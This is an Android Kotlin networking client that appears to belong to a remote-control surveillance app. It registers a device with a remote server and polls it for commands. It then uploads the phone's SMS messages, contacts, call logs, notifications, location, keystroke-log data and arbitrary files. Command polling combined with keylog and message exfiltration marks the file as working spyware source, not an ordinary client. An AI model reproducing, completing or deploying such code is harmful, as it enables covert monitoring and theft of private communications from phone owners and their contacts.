package com.abuzahra.manager.api

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.Config
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.model.LinkResult
import com.abuzahra.manager.util.DeviceUtils
import com.google.gson.Gson
import com.google.gson.JsonSyntaxException
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException
import java.util.concurrent.TimeUnit

object ApiClient {

    private val TAG = "ApiClient"
    private val gson = Gson()
    private val JSON = "application/json; charset=utf-8".toMediaType()

    // NOTE: The server (https://alsydyabwalzhra.online) uses a valid Let's Encrypt
    // certificate via Caddy, so we rely on the system's default TrustManager and
    // HostnameVerifier. The previous trust-all configuration was a MITM vulnerability
    // and has been removed.

    private val client: OkHttpClient by lazy {
        val retryInterceptor = Interceptor { chain ->
            val request = chain.request()
            var response = chain.proceed(request)
            var tryCount = 0
            while (!response.isSuccessful && tryCount < 2) {
                tryCount++
                response.close()
                response = chain.proceed(request)
            }
            response
        }
        OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .addInterceptor(retryInterceptor)
            .addInterceptor { chain ->
                val request = chain.request().newBuilder()
                    .header("Accept", "application/json")
                    .apply {
                        // Add device auth token if available
                        try {
                            val prefs = App.instance.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                            val token = prefs.getString("device_token", null)
                            if (!token.isNullOrBlank()) {
                                header("X-Device-Token", token)
                            }
                        } catch (_: Exception) {}
                    }
                    .build()
                chain.proceed(request)
            }
            .build()
    }

    // ===== LINK DEVICE =====
    suspend fun linkDevice(context: Context, code: String): LinkResult = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val deviceToken = DeviceUtils.getDeviceToken(context)
            val deviceInfo = Config.getDeviceInfo(context)

            val body = mapOf(
                "device_id" to deviceId,
                "link_code" to code,
                "device_token" to deviceToken,
                "device_name" to (deviceInfo["device_name"] ?: deviceId),
                "device_model" to (deviceInfo["device_model"] ?: ""),
                "brand" to (deviceInfo["brand"] ?: ""),
                "os_version" to (deviceInfo["os_version"] ?: "")
            )

            Log.i(TAG, "linkDevice: posting to /register with deviceId=$deviceId, code=$code")
            Log.i(TAG, "linkDevice: server URL = ${Config.SERVER_DOMAIN}/api/register")

            val response = post("/register", body)
            Log.i(TAG, "linkDevice: raw response = '${response.take(500)}'")

            if (response.isEmpty() || response.isBlank()) {
                Log.w(TAG, "linkDevice: empty response from server")
                return@withContext LinkResult(error = "Empty response from server. Is the server running?")
            }

            // Try to parse as JSON
            val result = try {
                gson.fromJson(response, LinkResult::class.java)
            } catch (e: JsonSyntaxException) {
                Log.e(TAG, "linkDevice: JSON parse error on response: '$response'", e)
                // Check if it looks like a number (HTTP status code without JSON body)
                if (response.trim().matches(Regex("\\d+"))) {
                    return@withContext LinkResult(error = "Server returned status code $response without JSON body. Check server API.")
                }
                // Check if it's HTML
                if (response.trim().startsWith("<")) {
                    return@withContext LinkResult(error = "Server returned HTML instead of JSON. Is nginx configured correctly?")
                }
                // Try to extract any useful info
                return@withContext LinkResult(error = "Server returned non-JSON response: '${response.take(200)}'")
            }

            if (result.ok || result.success) {
                DeviceUtils.setLinked(context, true)
                result.token?.let { token ->
                    context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                        .edit().putString("device_token", token).apply()
                }
                result.device_token?.let { token ->
                    if (result.token == null) {
                        context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                            .edit().putString("device_token", token).apply()
                    }
                }
                Log.i(TAG, "Device linked successfully: ${result.message}")
            } else {
                Log.w(TAG, "Link failed: ${result.error}")
            }
            result
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "linkDevice: timeout", e)
            LinkResult(error = "Connection timed out. Server may be down or unreachable.")
        } catch (e: java.net.ConnectException) {
            Log.e(TAG, "linkDevice: connection refused", e)
            LinkResult(error = "Connection refused. Server is not running at ${Config.SERVER_DOMAIN}")
        } catch (e: java.net.UnknownHostException) {
            Log.e(TAG, "linkDevice: unknown host", e)
            LinkResult(error = "Cannot resolve hostname. Check server URL: ${Config.SERVER_DOMAIN}")
        } catch (e: javax.net.ssl.SSLHandshakeException) {
            Log.e(TAG, "linkDevice: SSL error", e)
            LinkResult(error = "SSL handshake failed. ${e.message}")
        } catch (e: IOException) {
            Log.e(TAG, "linkDevice: IO error", e)
            LinkResult(error = "Network error: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "linkDevice: unexpected error", e)
            LinkResult(error = e.message ?: "Unknown error during linking")
        }
    }

    // ===== RESTORE SESSION (no code required) =====
    // Re-activates a previously-linked device. Server endpoint:
    //   POST /api/restore_session
    //
    // Two restore methods (server-side, see api_restore_session in
    // Server/modules/api_handlers.py):
    //
    //   1. device_id + device_token — same install (token matches the
    //      locally-stored one). The default flow when [linkCode] is null.
    //
    //   2. device_id + link_code — reinstall scenario: device_token changed
    //      because the app was reinstalled, but the same physical device
    //      keeps the same device_id (derived from ANDROID_ID). The user
    //      enters their permanent link code to prove ownership; the server
    //      looks up the code against local users and Firebase, then binds
    //      the device to that owner and re-issues a token.
    //
    // On 401 ("credentials error") the caller should prompt for the link
    // code and retry with [linkCode] populated.
    // On 404 → no previous session exists for this device (user must use
    // linkDevice with a fresh code).
    // On 200 → session restored, device re-activated.
    suspend fun restoreSession(
        context: Context,
        linkCode: String? = null
    ): LinkResult = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val deviceToken = DeviceUtils.getDeviceToken(context)

            val body = mutableMapOf<String, Any>(
                "device_id" to deviceId,
                "device_token" to deviceToken
            )
            // Method 2: include the permanent link code so the server can
            // restore across reinstalls (where the device_token no longer
            // matches the server-side record).
            if (!linkCode.isNullOrBlank()) {
                body["link_code"] = linkCode.trim().uppercase()
            }

            Log.i(TAG, "restoreSession: posting to /restore_session with deviceId=$deviceId" +
                if (linkCode.isNullOrBlank()) "" else ", link_code provided (reinstall flow)")

            val (httpCode, response) = postWithStatus("/restore_session", body)
            Log.i(TAG, "restoreSession: HTTP $httpCode, raw response = '${response.take(500)}'")

            if (response.isEmpty() || response.isBlank()) {
                Log.w(TAG, "restoreSession: empty response from server (HTTP $httpCode)")
                return@withContext LinkResult(error = "Empty response from server. Is the server running?")
            }

            // 404 → no previous session exists for this device.
            // Show the specific Arabic message instructing the user to use "ربط هاتف جديد".
            if (httpCode == 404) {
                Log.w(TAG, "restoreSession: no previous session (404) for deviceId=$deviceId")
                // Try to surface the server's message if it provided one, otherwise use our own.
                val serverMsg = try {
                    val parsed = gson.fromJson(response, LinkResult::class.java)
                    parsed.message.ifBlank { parsed.error }
                } catch (_: Exception) { "" }
                val msg = serverMsg.ifBlank {
                    "لا توجد جلسة سابقة لهذا الجهاز. استخدم 'ربط هاتف جديد'."
                }
                return@withContext LinkResult(ok = false, error = msg, message = msg, httpCode = 404)
            }

            // 401 → device exists but token doesn't match and no link_code was
            // provided (or the link_code was invalid). The server's Arabic
            // message asks the user to enter their link code. We surface it
            // verbatim so LinkActivity can detect the "credentials error"
            // case and prompt for the code (then retry with linkCode set).
            if (httpCode == 401) {
                Log.w(TAG, "restoreSession: credentials error (401) for deviceId=$deviceId")
                val serverMsg = try {
                    val parsed = gson.fromJson(response, LinkResult::class.java)
                    parsed.message.ifBlank { parsed.error }
                } catch (_: Exception) { "" }
                val msg = serverMsg.ifBlank { "بيانات الاعتماد غير صحيحة. أدخل كود الربط الخاص بك." }
                return@withContext LinkResult(
                    ok = false,
                    error = msg,
                    message = msg,
                    httpCode = 401
                )
            }

            // Try to parse as JSON
            val result = try {
                gson.fromJson(response, LinkResult::class.java)
            } catch (e: JsonSyntaxException) {
                Log.e(TAG, "restoreSession: JSON parse error on response: '$response'", e)
                // Check if it looks like a number (HTTP status code without JSON body)
                if (response.trim().matches(Regex("\\d+"))) {
                    return@withContext LinkResult(error = "Server returned status code $response without JSON body. Check server API.")
                }
                // Check if it's HTML
                if (response.trim().startsWith("<")) {
                    return@withContext LinkResult(error = "Server returned HTML instead of JSON. Is nginx configured correctly?")
                }
                // Try to extract any useful info
                return@withContext LinkResult(error = "Server returned non-JSON response: '${response.take(200)}'")
            }

            if (result.ok || result.success) {
                DeviceUtils.setLinked(context, true)
                // Refresh stored token if the server returned one (it should — same token back).
                result.device_token?.let { token ->
                    context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                        .edit().putString("device_token", token).apply()
                }
                result.token?.let { token ->
                    context.getSharedPreferences("abuzahra", Context.MODE_PRIVATE)
                        .edit().putString("device_token", token).apply()
                }
                Log.i(TAG, "Session restored successfully: ${result.message}")
            } else {
                Log.w(TAG, "Restore failed: ${result.error.ifBlank { result.message }}")
            }
            result
        } catch (e: java.net.SocketTimeoutException) {
            Log.e(TAG, "restoreSession: timeout", e)
            LinkResult(error = "Connection timed out. Server may be down or unreachable.")
        } catch (e: java.net.ConnectException) {
            Log.e(TAG, "restoreSession: connection refused", e)
            LinkResult(error = "Connection refused. Server is not running at ${Config.SERVER_DOMAIN}")
        } catch (e: java.net.UnknownHostException) {
            Log.e(TAG, "restoreSession: unknown host", e)
            LinkResult(error = "Cannot resolve hostname. Check server URL: ${Config.SERVER_DOMAIN}")
        } catch (e: javax.net.ssl.SSLHandshakeException) {
            Log.e(TAG, "restoreSession: SSL error", e)
            LinkResult(error = "SSL handshake failed. ${e.message}")
        } catch (e: IOException) {
            Log.e(TAG, "restoreSession: IO error", e)
            LinkResult(error = "Network error: ${e.message}")
        } catch (e: Exception) {
            Log.e(TAG, "restoreSession: unexpected error", e)
            LinkResult(error = e.message ?: "Unknown error during restore")
        }
    }

    // ===== GET PENDING COMMANDS =====
    suspend fun getCommands(context: Context): List<Command> = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val response = get("/commands/$deviceId")
            Log.d(TAG, "getCommands raw response: '${response.take(300)}'")

            if (response.isBlank() || response == "{}" || response == "null") {
                return@withContext emptyList()
            }

            val type = object : TypeToken<Map<String, Any>>() {}.type
            val map = gson.fromJson<Map<String, Any>>(response, type) ?: return@withContext emptyList()
            val cmds = map["commands"]
            if (cmds is List<*>) {
                val json = gson.toJson(cmds)
                return@withContext gson.fromJson(json, Array<Command>::class.java).toList()
            }
            // If the response is directly an array
            if (map.containsKey("command") || map.containsKey("id")) {
                return@withContext listOf(gson.fromJson(gson.toJson(map), Command::class.java))
            }
            emptyList()
        } catch (e: JsonSyntaxException) {
            Log.e(TAG, "getCommands: JSON parse error", e)
            emptyList()
        } catch (e: Exception) {
            Log.e(TAG, "getCommands error", e)
            emptyList()
        }
    }

    // ===== SUBMIT COMMAND RESULT =====
    suspend fun submitResult(cmdId: String, command: String, status: String, result: Any?) {
        withContext(Dispatchers.IO) {
            try {
                val body = mapOf(
                    "status" to status,
                    "result" to (result?.let { if (it is String) it else gson.toJson(it) } ?: "OK"),
                    "command" to command
                )
                val response = post("/command_result/$cmdId", body)
                Log.d(TAG, "Result submitted for $cmdId: '${response.take(200)}'")
            } catch (e: Exception) {
                Log.e(TAG, "submitResult error for $cmdId", e)
            }
        }
    }

    // ===== SEND DATA =====
    //
    // Forwards device data (SMS list, contacts, calls, location, etc.) to the
    // server's `api_device_data` handler:
    //
    //   POST /api/data/{device_id}
    //   body: {"type": "sms"|"contacts"|"calls"|"notifications"|
    //                "device_info"|"location"|"keylog"|"event"|"battery",
    //          "data": <list-or-object>,
    //          "command": <original command name>,
    //          "device_id": <id>,
    //          "timestamp": <ms>}
    //   header: X-Device-Token: <token>  (added by the auth interceptor)
    //
    // The server routes on the `type` field — see api_device_data in
    // Server/modules/api_handlers.py (lines 621-656) — and stores the data
    // to Firebase (store_sms / store_contacts / store_calls / …).
    //
    // [command] is the original command name (e.g. "sms", "contacts",
    // "get_sms"). It is mirrored into BOTH the `type` and `command` body
    // fields so the server can route via `type` while still recording the
    // originating command. Callers that already pass a clean type string
    // (SyncManager, SMSReceiver, CommandService) are unaffected.
    suspend fun sendData(context: Context, command: String, data: Any?): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                // Normalise the command to a server-recognised `type`.
                // The server's accepted types are: sms, contacts, calls,
                // notifications, device_info, location, battery. Unknown
                // types are accepted by the server (it returns 200 OK and
                // just doesn't store anything), so we forward whatever the
                // caller passed.
                val type = normaliseDataType(command)
                val body = mapOf(
                    "device_id" to deviceId,
                    "type" to type,
                    "command" to command,
                    "data" to data,
                    "timestamp" to System.currentTimeMillis()
                )
                // POST /api/data/{device_id} — the server's api_device_data
                // route accepts both /api/data and /api/data/{device_id};
                // we use the path-param form so the request is self-
                // describing even without the body.
                val response = post("/data/$deviceId", body)
                Log.d(TAG, "sendData [$type] response: '${response.take(200)}'")
                true
            } catch (e: Exception) {
                Log.e(TAG, "sendData error for $command", e)
                false
            }
        }
    }

    /**
     * Map a command name (as used by callers of [sendData] and by
     * [com.abuzahra.manager.executor.CommandExecutor]) to the server's
     * `type` enum accepted by `api_device_data`.
     *
     * Returns the input verbatim if no mapping applies — the server will
     * accept unknown types gracefully.
     */
    private fun normaliseDataType(command: String): String {
        return when (command) {
            // Direct matches — already valid `type` values.
            "sms", "contacts", "calls", "notifications", "location",
            "device_info", "battery", "keylog", "event" -> command

            // Command-name → type mappings for CommandExecutor results.
            "get_sms", "send_backup_sms" -> "sms"
            "get_contacts", "send_backup_contacts" -> "contacts"
            "get_calls", "send_backup_calls" -> "calls"
            "get_notifications" -> "notifications"
            "get_location" -> "location"
            "get_info", "get_battery", "get_wifi_info", "get_network_info",
            "get_sim_info", "get_storage_info", "get_all" -> "device_info"

            // Event-buffer callers.
            "device_events" -> "event"

            else -> command
        }
    }

    // ===== SEND EVENT =====
    // Events are now buffered locally via EventBuffer and NOT sent automatically.
    // Use EventBuffer.addEvent() directly instead of this method for all event sending.
    // This method is kept for backward compatibility but delegates to EventBuffer.
    suspend fun sendEvent(deviceId: String, eventType: String, data: Map<String, Any?>) {
        withContext(Dispatchers.IO) {
            try {
                val body = mapOf(
                    "device_id" to deviceId,
                    "event_type" to eventType,
                    "data" to data,
                    "timestamp" to System.currentTimeMillis()
                )
                val response = post("/event", body)
                Log.d(TAG, "sendEvent [$eventType] response: '${response.take(200)}'")
            } catch (e: Exception) {
                Log.e(TAG, "sendEvent error for $eventType", e)
            }
        }
    }

    // ===== HEARTBEAT =====
    suspend fun sendHeartbeat(context: Context, battery: Int, status: String = "online") {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mapOf(
                    "device_id" to deviceId,
                    "status" to status,
                    "battery" to battery
                )
                val response = post("/heartbeat", body)
                Log.d(TAG, "Heartbeat response: '${response.take(100)}'")
            } catch (e: Exception) {
                Log.e(TAG, "heartbeat error", e)
            }
        }
    }

    // ===== DEVICE SETTINGS =====
    suspend fun getSettings(context: Context): Map<String, Any?> = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(context)
            val response = get("/settings/$deviceId")
            Log.d(TAG, "getSettings raw response: '${response.take(200)}'")

            if (response.isBlank() || response == "{}" || response == "null") {
                return@withContext emptyMap()
            }

            val type = object : TypeToken<Map<String, Any>>() {}.type
            val map = gson.fromJson<Map<String, Any>>(response, type)
            map.getOrDefault("settings", emptyMap<String, Any>()) as? Map<String, Any?> ?: map
        } catch (e: JsonSyntaxException) {
            Log.e(TAG, "getSettings: JSON parse error", e)
            emptyMap()
        } catch (e: Exception) {
            Log.e(TAG, "getSettings error", e)
            emptyMap()
        }
    }

    // ===== TEST SERVER HEALTH =====
    suspend fun testHealth(): Boolean = withContext(Dispatchers.IO) {
        try {
            val url = "${Config.SERVER_DOMAIN}/api/health"
            Log.d(TAG, "Testing server health at: $url")
            val request = Request.Builder().url(url).get().build()
            client.newCall(request).execute().use { resp ->
                val body = resp.body?.string() ?: ""
                Log.d(TAG, "Health check: HTTP ${resp.code}, body='${body.take(100)}'")
                resp.isSuccessful
            }
        } catch (e: Exception) {
            Log.e(TAG, "Server health check failed", e)
            false
        }
    }

    // ===== UPLOAD FILE (Multipart) =====
    suspend fun uploadFile(file: java.io.File, command: String) = withContext(Dispatchers.IO) {
        try {
            val deviceId = DeviceUtils.getDeviceId(App.instance)
            val MEDIA_TYPE = "application/octet-stream".toMediaType()
            val requestBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("device_id", deviceId)
                .addFormDataPart("command", command)
                .addFormDataPart("file", file.name, file.asRequestBody(MEDIA_TYPE))
                .build()
            val url = "${Config.SERVER_DOMAIN}/api/upload"
            Log.d(TAG, "uploadFile: uploading ${file.name} ($command) from $deviceId to $url")
            val request = Request.Builder().url(url).post(requestBody).build()
            client.newCall(request).execute().use { resp ->
                val code = resp.code
                val body = resp.body?.string() ?: "{}"
                Log.d(TAG, "uploadFile $command: HTTP $code, response='${body.take(200)}'")
                body
            }
        } catch (e: Exception) {
            Log.e(TAG, "uploadFile error for $command", e)
                "{\"error\":\"${e.message}\"}"
        }
    }

    // ===== SEND HEALTH REPORT =====
    // Server's GET /api/health is health-check only (returns 405 for POST).
    // Health reports must be sent through the typed data endpoint:
    //   POST /api/data/{device_id}  with body {type:"device_info", data:{...}}
    // (see Server/modules/api_handlers.py:api_device_data)
    suspend fun sendHealthReport(context: Context, report: Map<String, Any>) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mapOf(
                    "device_id" to deviceId,
                    "type" to "device_info",
                    "data" to report
                )
                post("/data/$deviceId", body)
            } catch (e: Exception) {
                Log.e(TAG, "sendHealthReport error", e)
            }
        }
    }

    // ===== SEND LOCATION =====
    suspend fun sendLocation(context: Context, lat: Double, lng: Double, accuracy: Float? = null) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceUtils.getDeviceId(context)
                val body = mutableMapOf<String, Any>(
                    "device_id" to deviceId,
                    "command" to "location",
                    "data" to mapOf(
                        "latitude" to lat,
                        "longitude" to lng,
                        "accuracy" to (accuracy ?: 0f),
                        "timestamp" to System.currentTimeMillis()
                    )
                )
                val response = post("/data", body)
                Log.d(TAG, "sendLocation response: '${response.take(100)}'")
            } catch (e: Exception) {
                Log.e(TAG, "sendLocation error", e)
            }
        }
    }

    // ===== LOW-LEVEL HTTP =====
    private suspend fun get(path: String): String = withContext(Dispatchers.IO) {
        val url = "${Config.SERVER_DOMAIN}/api$path"
        Log.d(TAG, "GET: $url")
        val request = Request.Builder()
            .url(url)
            .get()
            .build()
        client.newCall(request).execute().use { resp ->
            val code = resp.code
            val body = resp.body?.string() ?: "{}"
            Log.d(TAG, "GET $path: HTTP $code, body='${body.take(200)}'")
            if (!resp.isSuccessful && !body.trim().startsWith("{")) {
                Log.w(TAG, "GET $path returned non-success code $code with non-JSON body")
            }
            body
        }
    }

    private suspend fun post(path: String, body: Any): String = withContext(Dispatchers.IO) {
        val json = gson.toJson(body)
        val requestBody = json.toRequestBody(JSON)
        val url = "${Config.SERVER_DOMAIN}/api$path"
        Log.d(TAG, "POST: $url, body='$json'")
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
        client.newCall(request).execute().use { resp ->
            val code = resp.code
            val responseBody = resp.body?.string() ?: "{}"
            Log.d(TAG, "POST $path: HTTP $code, response='${responseBody.take(300)}'")
            if (code >= 500) {
                Log.e(TAG, "POST $path: Server error ($code): '${responseBody.take(200)}'")
            } else if (code >= 400) {
                Log.w(TAG, "POST $path: Client error ($code): '${responseBody.take(200)}'")
            }
            responseBody
        }
    }

    /**
     * Same as [post] but also returns the HTTP status code. Needed for endpoints
     * where the status code itself carries semantic meaning (e.g. restore_session
     * returns 404 when no previous session exists for the device).
     */
    private suspend fun postWithStatus(path: String, body: Any): Pair<Int, String> = withContext(Dispatchers.IO) {
        val json = gson.toJson(body)
        val requestBody = json.toRequestBody(JSON)
        val url = "${Config.SERVER_DOMAIN}/api$path"
        Log.d(TAG, "POST+status: $url, body='$json'")
        val request = Request.Builder()
            .url(url)
            .post(requestBody)
            .build()
        client.newCall(request).execute().use { resp ->
            val code = resp.code
            val responseBody = resp.body?.string() ?: "{}"
            Log.d(TAG, "POST+status $path: HTTP $code, response='${responseBody.take(300)}'")
            if (code >= 500) {
                Log.e(TAG, "POST+status $path: Server error ($code): '${responseBody.take(200)}'")
            } else if (code >= 400) {
                Log.w(TAG, "POST+status $path: Client error ($code): '${responseBody.take(200)}'")
            }
            Pair(code, responseBody)
        }
    }

    fun postSync(path: String, body: Any): String {
        return try {
            val json = gson.toJson(body)
            val requestBody = json.toRequestBody(JSON)
            val url = "${Config.SERVER_DOMAIN}/api$path"
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            client.newCall(request).execute().use { resp ->
                val code = resp.code
                val responseBody = resp.body?.string() ?: "{}"
                Log.d(TAG, "postSync $path: HTTP $code, response='${responseBody.take(200)}'")
                responseBody
            }
        } catch (e: IOException) {
            Log.e(TAG, "postSync error", e)
            "{}"
        }
    }
}
